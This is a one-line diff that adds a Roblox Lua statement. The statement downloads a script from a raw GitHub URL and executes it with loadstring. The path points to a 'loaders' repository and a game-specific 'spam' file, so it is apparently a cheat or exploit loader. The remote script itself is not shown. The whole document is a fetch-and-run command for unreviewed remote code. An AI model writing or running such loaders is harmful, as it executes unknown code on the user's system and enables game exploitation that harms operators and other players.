@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/halloween-anime-astral-simulator-spam1-l7bs9rf0o772a1.lua"))()
